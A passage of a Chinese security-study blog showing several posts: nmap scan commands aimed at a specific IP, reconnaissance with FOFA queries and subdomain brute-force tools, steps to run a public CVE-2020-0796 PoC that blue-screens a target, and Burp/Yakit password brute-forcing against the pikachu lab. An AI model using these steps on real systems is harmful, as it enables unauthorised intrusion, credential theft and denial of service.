<h4 id="2-扫描指定IP地址"><a href="#2-扫描指定IP地址" class="headerlink" title="2.扫描指定IP地址"></a><strong>2.扫描指定IP地址</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 175.178.10.6 || nmap -p- 175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191403183.png" alt="image-20240108191403183"></p>
<h4 id="3-提取文件中的IP地址"><a href="#3-提取文件中的IP地址" class="headerlink" title="3.提取文件中的IP地址"></a><strong>3.提取文件中的IP地址</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>

<h4 id="4-扫描主机的指定端口"><a href="#4-扫描主机的指定端口" class="headerlink" title="4.扫描主机的指定端口"></a>4.<strong>扫描主机的指定端口</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191718414.png" alt="image-20240108191718414"></p>
<h4 id="5-使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）"><a href="#5-使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）" class="headerlink" title="5.使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）"></a><strong>5.使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接</strong>）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS  175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191825987.png" alt="image-20240108191825987"></p>
<h4 id="6-使用TCP进行扫描（默认nmap扫描方式）"><a href="#6-使用TCP进行扫描（默认nmap扫描方式）" class="headerlink" title="6.使用TCP进行扫描（默认nmap扫描方式）"></a>6.<strong>使用TCP进行扫描（默认nmap扫描方式）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT  175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191946431.png" alt="image-20240108191946431"></p>
<h4 id="7-使用UDP进行扫描（扫描UDP开放的端口）"><a href="#7-使用UDP进行扫描（扫描UDP开放的端口）" class="headerlink" title="7.使用UDP进行扫描（扫描UDP开放的端口）"></a>7.<strong>使用UDP进行扫描（扫描UDP开放的端口）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 175.178.10.6</span><br></pre></td></tr></table></figure>

<h4 id="8-使用FIN扫描"><a href="#8-使用FIN扫描" class="headerlink" title="8.使用FIN扫描"></a>8.<strong>使用FIN扫描</strong></h4><p>有的时候TCP SYN不是最佳的扫描默认，目标主机可能有IDS&#x2F;IPS系统的存在，防火墙可能过滤掉SYN数据包。而发送一个FIN标志的数据包不需要完成TCP的握手。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF  175.178.10.6</span><br></pre></td></tr></table></figure>

<h4 id="9-idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）"><a href="#9-idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）" class="headerlink" title="9.idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）"></a>9.<strong>idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）</strong></h4><p>idlescan是一种理想的扫描方式，它使用另一台网络上的主机替你发送数据包，从而隐藏自己。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI  192.168.3.227(代替本机发送数据包的主机的IP地址) 175.178.10.6(要访问的IP地址)</span><br></pre></td></tr></table></figure>

<h4 id="10-获得服务版本详细信息"><a href="#10-获得服务版本详细信息" class="headerlink" title="10.获得服务版本详细信息"></a>10.<strong>获得服务版本详细信息</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108192658674.png" alt="image-20240108192658674"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/nmap%E4%BD%BF%E7%94%A8/" data-id="clrmsspnr0000j0u41kbz3g0z" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-信息搜集" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
  <time class="post-time" datetime="2024-01-08T11:05:53.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>1.内容</strong>：收集信息主要为目标资产与可能存在相关漏洞的信息。包括但不限于主站、 二级域名、旁站、c 段、微信公众号、微信小程序、App 程序、下属单位、子公 司、开发商、域名厂商、dns 、服务器、cdn 厂商、服务器厂商等。</p>
<p><strong>2.作用</strong>：了解组织安全架构，缩小攻击范围，描绘网络拓扑结构，建立脆弱点</p>
<h4 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h4><p>通过与目标交互，从而拿到目的信息</p>
<p><strong>缺点</strong>：会暴露自己，留下访问日志</p>
<h4 id="单位股权架构"><a href="#单位股权架构" class="headerlink" title="单位股权架构"></a>单位股权架构</h4><p><strong>单位组织信息：</strong>组织架构、子公司、下属单位、注册资本（cnvd证书）</p>
<p><strong>查询方法：</strong>天眼查、企查查、爱企查、小蓝本、钉钉企典等</p>
<p><strong>查用网址工具：</strong></p>
<ol>
<li><strong>天眼查</strong> <a target="_blank" rel="noopener" href="https://m.tianyancha.com/">天眼查</a></li>
<li><strong>企查查</strong><a target="_blank" rel="noopener" href="https://www.qcc.com/">企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查!</a></li>
<li><strong>小蓝本</strong><a target="_blank" rel="noopener" href="https://www.xiaolanben.com/">获客营销系统_ai智能拓客系统_企业获客系统-小蓝本拓客软件</a></li>
<li><strong>爱企查</strong><a target="_blank" rel="noopener" href="https://www.aiqicha.com/">爱企查首页 - 专业企业查询平台 - 查企业 - 查老板 - 查风险 - 工商信息查询系统</a></li>
<li><strong>国外企查</strong> <a target="_blank" rel="noopener" href="https://opencorporates.com/">https://opencorporates.com/</a></li>
</ol>
<p>这里需要注意的是资产不一定是带baidu的，可能是一些其它的，如果是百度百分百控股的也可以提交，或者域名反查是不是百度百分百控股的，这种就属于是边缘资产。</p>
<h4 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h4><p>主要分为备案域名和非备案域名</p>
<p><strong>核心目的：子域名挖掘</strong></p>
<h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><p>子域名在线爆破：<a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a></p>
<h5 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h5><p>fofa:<a target="_blank" rel="noopener" href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p>
<p>360:<a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></p>
<p>奇安信：<a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<p>钟馗之眼：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/business">https://www.zoomeye.org/business</a></p>
<p>shodan：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>CensysSearch:<a target="_blank" rel="noopener" href="https://search.censys.io/">https://search.censys.io/</a></p>
<p>微步在线：<a target="_blank" rel="noopener" href="https://www.threatbook.cn/next/index">https://www.threatbook.cn/next/index</a></p>
<p>whois查询：<a target="_blank" rel="noopener" href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a> </p>
<p><strong>fofa语法：（fofa有一个很有趣的地方是fofa可以用于检测蜜罐了</strong>😲）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">title=”beijing” 从标题中搜索“北京” </span><br><span class="line"> </span><br><span class="line">header=”elastic” 从 http 头中搜索“elastic” </span><br><span class="line"></span><br><span class="line">body=”网络空间测绘” 从 html 正文中搜索“网络空间测绘” </span><br><span class="line"> </span><br><span class="line">domain=”qq.com” 搜索根域名带有 qq.com 的网站。 </span><br><span class="line"> </span><br><span class="line">icon_hash=”-247388890” 搜索使用此 icon 的资产。仅限 FOFA 高级会员使用</span><br><span class="line"></span><br><span class="line">fid=&quot;sSXXGNUO2FefBTcCLIT/2Q==&quot;	</span><br><span class="line"></span><br><span class="line">host=”.gov.cn” 从 url 中搜索”.gov.cn” 搜索要用 host 作为名称 </span><br><span class="line"> </span><br><span class="line">port=”6379” 查找对应“6379”端口的资产 </span><br><span class="line"></span><br><span class="line">cert=“baidu” 搜索证书(https或者imaps等)中带有baidu的资产</span><br><span class="line"></span><br><span class="line">icp=”京 ICP 证 030173 号” 查找备案号为“京 ICP 证 030173 号”的网站 搜索网站类型资产 </span><br><span class="line"> </span><br><span class="line">ip=”1.1.1.1” 从 ip 中搜索包含“1.1.1.1”的网站 搜索要用 ip 作为名称 </span><br><span class="line"> </span><br><span class="line">ip=”220.181.111.1/24” 查询 IP 为“220.181.111.1”的 C 网段资产 </span><br><span class="line"> </span><br><span class="line">status_code=”402” 查询服务器状态为“402”的资产 </span><br><span class="line"> </span><br><span class="line">app=&quot;&quot; 查找设备 </span><br><span class="line"> </span><br><span class="line">protocol=&quot;&quot; 查询协议资产 </span><br><span class="line"></span><br><span class="line">js_name=&quot;js/jquery.js&quot;</span><br><span class="line"></span><br><span class="line">js_md5=&quot;82ac3f14327a8b7ba49baa208d4eaa15&quot;</span><br><span class="line"></span><br><span class="line">is_honeypot=&quot;false&quot; 检测是不是蜜罐</span><br><span class="line"></span><br><span class="line">以下为例： </span><br><span class="line"> </span><br><span class="line">查找有 elasticsearch 的服务器 </span><br><span class="line"> </span><br><span class="line">port=&quot;9200&quot; &amp;&amp; protocol==&quot;elastic&quot; </span><br><span class="line"> </span><br><span class="line">app=&quot;redis&quot; &amp;&amp; country=CN </span><br><span class="line"> </span><br><span class="line">app=&quot;泛微-协同商务系统&quot; </span><br><span class="line">app=&quot;泛微-协同商务系统&quot; || app=&quot;泛微-协同办公 OA&quot; || app=&quot;泛微-E-Weaver&quot; || app=&quot;泛微- EOffice&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="工具字典"><a href="#工具字典" class="headerlink" title="工具字典"></a>工具字典</h4><p>github上面有很多的子域名字典，有些工具也有自带的字典，字典还是要靠自己平时构造和收集</p>
<h4 id="OneForAll-Python"><a href="#OneForAll-Python" class="headerlink" title="OneForAll(Python)"></a>OneForAll(Python)</h4><p>下载网址：<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>运行示例：python3 oneforall.py –target&#x3D;target.com run</p>
<h4 id="Layer-Win"><a href="#Layer-Win" class="headerlink" title="Layer(Win)"></a>Layer(Win)</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></p>
<h4 id="dnsenum-kali"><a href="#dnsenum-kali" class="headerlink" title="dnsenum(kali)"></a>dnsenum(kali)</h4><h4 id="subDomainsBrute-python"><a href="#subDomainsBrute-python" class="headerlink" title="subDomainsBrute(python)"></a>subDomainsBrute(python)</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>运行示例：python subDomainsbrute.py xtarget.com</p>
<h4 id="Sublist3r-python"><a href="#Sublist3r-python" class="headerlink" title="Sublist3r(python)"></a>Sublist3r(python)</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p>
<p>运行示例：python sublist3r.py -d target.com -b -t 50 -p 80,443,21,22</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="clrmsspny0004j0u45502bogj" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-永恒之黑" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/" class="article-date">
  <time class="post-time" datetime="2024-01-08T02:55:56.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">永恒之黑</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>从<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">检测工具</a> 这个网址下载检测工具</p>
<p>执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796-Scanner.exe 攻击电脑的IP地址 </span><br></pre></td></tr></table></figure>

<p>查看是否有永恒之黑漏洞</p>
<p>下载poc脚本发起攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载POC：https://github.com/eerykitty/CVE-2020-0796-PoC</span><br></pre></td></tr></table></figure>

<p>需要下载一些python文件，才能运行脚本。pip下载，根据提示下载相应文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 攻击电脑的IP地址 </span><br></pre></td></tr></table></figure>

<p>运行脚本被攻击的电脑就会蓝屏。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/" data-id="clr4cz49o0001pwu4727ffa6a" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-暴力破解" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="article-date">
  <time class="post-time" datetime="2024-01-08T01:18:55.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">暴力破解</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Yakit暴力破解"><a href="#Yakit暴力破解" class="headerlink" title="Yakit暴力破解"></a>Yakit暴力破解</h3><p>打开Yakit，在Yakit打开的网页输入pikachu的网址。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108092442014.png" alt="image-20240108092442014"></p>
<p>打开pikachu中的基于表单的暴力破解</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108092158843.png" alt="image-20240108092158843"></p>
<p>Yakit点击手动劫持</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093048992.png" alt="image-20240108093048992"></p>
<p>pikachu中随便输入，提交。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093142811.png" alt="image-20240108093142811"></p>
<p>就提取到来网页</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093232908.png" alt="image-20240108093232908"></p>
<p>右键，发送到web fuzzer.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093329614.png" alt="image-20240108093329614"></p>
<p>将原有的username和password删掉。右键添加模糊字典。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093508337.png" alt="image-20240108093508337"></p>
<p>分别添加。user字典和pass字典。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093537998.png" alt="image-20240108093537998"></p>
<p>点击发送请求。在点击相应大小。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108093926977.png" alt="image-20240108093926977"></p>
<p>可以看到有一组不同的，说明账号密码为admin，123456.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108094137304.png" alt="image-20240108094137304"></p>
<h3 id="burp暴力破解"><a href="#burp暴力破解" class="headerlink" title="burp暴力破解"></a>burp暴力破解</h3><p>在浏览器中打开皮卡出，并点击burp链接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108094821661.png" alt="image-20240108094821661"></p>
<p>点击拦截请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095411463.png" alt="image-20240108095411463"></p>
<p>输入账号密码，点击运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095514811.png" alt="image-20240108095514811"></p>
<p>右键发送到测试器</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095610761.png" alt="image-20240108095610761"></p>
<p>将账号密码添加包括</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095732068.png" alt="image-20240108095732068"></p>
<p>并将攻击类型选为集束炸弹</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108095839350.png" alt="image-20240108095839350"></p>
<p>点击有效载荷</p>
<p>有效负载集选择1也就是我们添加的第一个—-用户名</p>
<p>在清单中加入可用的用户名，也可以导入文件或使用burp自带的字典</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108100424576.png" alt="image-20240108100424576"></p>
<p>同理另一个选着密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108100631187.png" alt="image-20240108100631187"></p>
<p>点击开始攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108101010411.png" alt="image-20240108101010411"></p>
<p>然后点击长，有区别的就可能是正确密码。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108101202368.png" alt="image-20240108101202368"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/08/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" data-id="clr4cz49m0000pwu4gpwog3bq" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">next &amp;raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Hexo</h1>
    <h2 class="blog-subtitle"></h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
    <h2 class="author">John Doe</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2023 - 2024 John Doe<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  
<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">

  
<script src="/plugin/galmenu/GalMenu.js"></script>

  <div class="GalMenu GalDropDown">
      <div class="circle" id="gal">
        <div class="ring">
          
            <a href="/" title="" class="menuItem">首页</a>
          
            <a href="/tags" title="" class="menuItem">标签</a>
          
            <a href="/categories" title="" class="menuItem">分类</a>
          
            <a href="/archives" title="" class="menuItem">归档</a>
          
            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
          
            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
          
        </div>
        
          <audio id="audio" src="#"></audio>
        
      </div> 
</div>
<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
    for (var i = 0,
    l = items.length; i < l; i++) {
      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
    }</script>
<script type="text/javascript">
  $(document).ready(function() {
    $('body').GalMenu({
      'menu': 'GalDropDown'
    })
  });
</script>

  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>